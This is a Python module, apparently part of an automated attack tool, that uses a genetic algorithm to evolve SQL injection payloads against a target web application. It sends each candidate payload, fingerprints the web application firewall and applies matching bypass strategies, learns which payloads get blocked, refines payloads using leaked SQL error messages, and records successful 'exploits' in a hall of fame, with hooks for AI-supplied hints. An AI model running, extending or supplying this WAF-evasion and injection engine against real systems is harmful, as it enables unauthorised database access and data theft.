import random
import time
import json
from core.mutator_ast import ASTMutator
from core.predictive_blocker import PredictiveBlocker
from core.waf_fingerprinter import WAFFingerprinter
from core.error_refiner import SQLErrorRefiner
from utils.success_validator import SuccessValidator

class IslandManager:
    def __init__(self, client, base_payloads, exp_manager, population_size=12, num_islands=3, context="GENERIC"):
        self.client = client
        self.exp_manager = exp_manager
        self.base_seeds = base_payloads
        self.num_islands = num_islands
        self.island_pop_size = population_size // num_islands
        self.validator = SuccessValidator()
        self.best_score_history = []
        self.hall_of_fame = [] 
        self.discovered_niches = set()
        self.stagnation_counter = 0
        self.context = context
        self.blocker = PredictiveBlocker()
        self.fingerprinter = WAFFingerprinter()
        self.error_refiner = SQLErrorRefiner()
        self.session_tested = set() # Avoid repeating in same session
        self.current_gen = 0
        
        # Initialize Islands with their own mutators and populations
        self.islands = []
        
        # Try to load previous state
        saved_state = self.exp_manager.load_session_state(client.base_url)
        if saved_state:
            try:
                state = json.loads(saved_state)
                self.current_gen = state.get('gen_num', 0)
                print(f"[*] Resuming from previous session (Generation {self.current_gen})", flush=True)
                for i_data in state['islands']:
                    mutator = ASTMutator(context=context)
                    mutator.strategy_weights = i_data['weights']
                    mutator.keyword_reputation = i_data['reputation']
                    self.islands.append({
                        "id": i_data['id'],
                        "mutator": mutator,
                        "population": i_data['population']
                    })
                return # Skip default initialization
            except Exception as e:
                print(f"[!] Failed to load state: {e}. Starting fresh.", flush=True)

        for i in range(num_islands):
            mutator = ASTMutator(context=context)
            # 1. Context-Aware Initialization
            if context == "SINGLE_QUOTE":
                mutator.strategy_weights["context_aware"] *= 3.0
                print(f"[*] Island {i}: Optimizing for SINGLE_QUOTE context.", flush=True)
            elif context == "DOUBLE_QUOTE":
                mutator.strategy_weights["context_aware"] *= 3.0
                print(f"[*] Island {i}: Optimizing for DOUBLE_QUOTE context.", flush=True)

            # Specialization: Each island has a different initial bias
            if i == 0: # Structural Island
                mutator.strategy_weights["logical_alts"] *= 2.0
                mutator.strategy_weights["union_balance"] *= 2.0
            elif i == 1: # Bypass Island
                mutator.strategy_weights["inline_comments"] *= 2.0
                mutator.strategy_weights["junk_fill"] *= 2.0
            else: # Context Island
                mutator.strategy_weights["context_aware"] *= 2.0

            # Initialize population for this island
            golden_seeds = self.exp_manager.get_golden_payloads(limit=10)
            combined_seeds = golden_seeds + base_payloads
            pop = random.sample(combined_seeds, min(len(combined_seeds), self.island_pop_size))
            
            self.islands.append({
                "id": i,
                "population": pop,
                "mutator": mutator,
                "stagnation": 0,
                "best_score": 0
            })

        print(f"[*] Archipelago Initialized: {num_islands} Islands established.", flush=True)

    def _calculate_similarity(self, p1, p2):
        """Simple Jaccard similarity based on characters to detect structural bias."""
        s1, s2 = set(p1), set(p2)
        intersection = len(s1.intersection(s2))
        union = len(s1.union(s2))
        return intersection / union if union > 0 else 0

    def evolve_generation(self, gen_num):
        global_max_score = 0
        
        # 0. Poll for AI Hints from SQLite
        hints = self.exp_manager.get_latest_hint()
        if hints:
            print(f"[*] AI HINT RECEIVED: {hints.get('suggestion', 'N/A')}", flush=True)
            for island in self.islands:
                island["mutator"].apply_hint(hints)

        # 1. Evolve each island independently
        for island in self.islands:
            island_results = self._evolve_island(island, gen_num)
            if island_results["max_score"] > global_max_score:
                global_max_score = island_results["max_score"]
            
            # Track island-specific stagnation
            if island_results["max_score"] <= island["best_score"]:
                island["stagnation"] += 1
            else:
                island["stagnation"] = 0
                island["best_score"] = island_results["max_score"]

        # 2. Migration Step: Every 5 generations, exchange genetic material
        if gen_num > 0 and gen_num % 5 == 0:
            self._migrate()

        self.best_score_history.append(global_max_score)
        
        # Global stagnation tracking
        if len(self.best_score_history) > 1:
            if self.best_score_history[-1] <= self.best_score_history[-2]:
                self.stagnation_counter += 1
                if self.stagnation_counter >= 5:
                    # Request AI Analysis
                    best_p = self.hall_of_fame[-1] if self.hall_of_fame else self.base_seeds[0]
                    print(f"[ANALYSIS_REQUIRED] Payload: {best_p} | Stagnation: {self.stagnation_counter}", flush=True)
            else:
                self.stagnation_counter = 0

        # 3. Save Session State for Persistence
        state = {
            "gen_num": gen_num,
            "islands": [
                {
                    "id": i["id"],
                    "population": i["population"],
                    "weights": i["mutator"].strategy_weights,
                    "reputation": i["mutator"].keyword_reputation
                } for i in self.islands
            ]
        }
        self.exp_manager.save_session_state(self.client.base_url, json.dumps(state))

        return self.hall_of_fame[-1] if self.hall_of_fame else None

    def _evolve_island(self, island, gen_num):
        pop_data = island["population"]
        mutator = island["mutator"]
        scored_population = []
        max_score = 0
        
        # Extract payloads for processing
        pop = [p["payload"] if isinstance(p, dict) else p for p in pop_data]
        parents = {p["payload"]: p["parent"] for p in pop_data if isinstance(p, dict)}

        # Calculate diversity for this island
        unique_payloads = len(set(pop))
        diversity_ratio = unique_payloads / len(pop) if pop else 0

        # Dynamic Mutation Intensity for this island
        calc_intensity = 1.0 + (island["stagnation"] * 0.8)
        if diversity_ratio < 0.75:
            calc_intensity += (0.75 - diversity_ratio) * 4.0
        mutation_intensity = min(max(1, round(calc_intensity)), 6)

        if mutation_intensity >= 3:
            print(f"  [!] Island {island['id']} Chaos: Intensity {mutation_intensity} | Diversity: {diversity_ratio:.2f}", flush=True)

        for i, payload in enumerate(pop):
            if payload in self.hall_of_fame: continue
            
            # 0. Avoid repeating successful payloads in the same session
            if payload in self.session_tested:
                continue

            # 1. Predictive Blocking (The Intelligent Filter)
            blocked, reason = self.blocker.should_block(payload)
            if blocked:
                print(f"  [Island {island['id']}] {i+1}/{len(pop)}: [SKIPPED] Matches known block rule: {reason}", flush=True)
                score, status = 0.05, "PREDICTIVE_BLOCKED"
                mutator.report_success(payload, score)
                scored_population.append((payload, score, None))
                continue

            response = self.client.send_request(payload)
            
            # 1.1 WAF Fingerprinting (First Request of the generation or if unknown)
            if i == 0:
                waf = self.fingerprinter.identify(response['headers'], response['text'])
                if waf != "GENERIC / UNKNOWN":
                    print(f"[*] WAF DETECTED: {waf}", flush=True)
                    strategy = self.fingerprinter.get_bypass_strategy(waf)
                    mutator.apply_hint({"suggestion": strategy["hint"], "weights": strategy["weights"]})

            score, status = self.validator.validate(response['text'], response['status'])
            
            # 2. Learning from real blocks
            if score <= 0.1:
                self.blocker.learn_from_block(payload)
            elif score >= 0.8:
                self.blocker.report_success(payload)

            # 3. SQL Error Refinement
            error_msg = self.validator.get_sql_error(response['text'])
            if error_msg:
                refinement = self.error_refiner.refine(payload, error_msg)
                if refinement:
                    print(f"  [REFINEMENT] SQL Error detected. Strategy: {refinement['strategy']}", flush=True)
                    mutator.apply_hint({"suggestion": refinement["strategy"]})

            # Similarity Penalty
            for successful_p in self.hall_of_fame:
                if self._calculate_similarity(payload, successful_p) > 0.8:
                    score *= 0.5
                    status = f"BIASED_{status}"
                    break

            print(f"  [Island {island['id']}] {i+1}/{len(pop)}: {payload[:30]}... [{score:.2f} | {status}]", flush=True)
            
            parent = parents.get(payload)
            self.exp_manager.save_attempt(payload, score, status, parent_payload=parent)
            mutator.report_success(payload, score)
            scored_population.append((payload, score, error_msg))
            
            if score >= 0.9:
                self.session_tested.add(payload)

            if score > max_score: max_score = score
            
            # Multi-Success Awareness
            if score >= 0.9 and payload not in self.hall_of_fame:
                if status not in self.discovered_niches:
                    print(f"[!!!] NEW EXPLOIT TYPE (Island {island['id']}): {status} | {payload}", flush=True)
                    self.discovered_niches.add(status)
                    self.hall_of_fame.append(payload)
                    self.exp_manager.save_exploit(payload, status)
                elif score >= 1.0:
                    self.hall_of_fame.append(payload)
                    self.exp_manager.save_exploit(payload, "PERFECT_MATCH")

        # Next Gen for this island
        scored_population.sort(key=lambda x: x[1], reverse=True)
        elites = [p[0] for p in scored_population[:max(1, int(self.island_pop_size * 0.2))]]
        survivors = [p for p in scored_population if p[1] >= 0.15]
        
        island["population"] = self._generate_next_gen(elites, survivors, mutation_intensity, mutator)
        
        return {"max_score": max_score}

    def _migrate(self):
        """Copies the best payload from each island to the next one in the ring."""
        print("[*] Migration Event: Exchanging genetic material between islands...", flush=True)
        for i in range(self.num_islands):
            source_island = self.islands[i]
            target_island = self.islands[(i + 1) % self.num_islands]
            
            # Get best from source (first in population is usually elite)
            best_payload = source_island["population"][0]
            
            # Inject into target island (replace a random one that isn't elite)
            replace_idx = random.randint(1, len(target_island["population"]) - 1)
            target_island["population"][replace_idx] = best_payload

    def _generate_next_gen(self, elites, survivors, intensity, mutator):
        next_gen = []
        # Elites stay as they are, but we track them
        for e in elites:
            next_gen.append({"payload": e, "parent": e})

        if not survivors:
            seeds = random.sample(self.base_seeds, min(len(self.base_seeds), self.island_pop_size))
            return [{"payload": s, "parent": None} for s in seeds]

        while len(next_gen) < self.island_pop_size:
            rand_val = random.random()
            
            if rand_val < 0.1:
                s = random.choice(self.base_seeds)
                next_gen.append({"payload": s, "parent": None})
            elif rand_val < 0.4 and len(survivors) >= 2:
                p1, p2 = random.sample(survivors, 2)
                child = self._crossover(p1[0], p2[0])
                mutated = mutator.mutate(child, intensity=intensity)
                next_gen.append({"payload": mutated, "parent": p1[0]})
            else:
                parent_data = random.choice(survivors)
                child = mutator.mutate(parent_data[0], error_msg=parent_data[2], intensity=intensity)
                next_gen.append({"payload": child, "parent": parent_data[0]})
        
        return next_gen

    def _crossover(self, p1, p2):
        """Combines two payloads by splitting them at a random keyword."""
        keywords = ["UNION", "SELECT", "WHERE", "AND", "OR"]
        for kw in keywords:
            if kw in p1.upper() and kw in p2.upper():
                parts1 = p1.upper().split(kw)
                parts2 = p2.upper().split(kw)
                return parts1[0] + kw + parts2[1]
        # Fallback: simple string split
        split_idx = len(p1) // 2
        return p1[:split_idx] + p2[split_idx:]
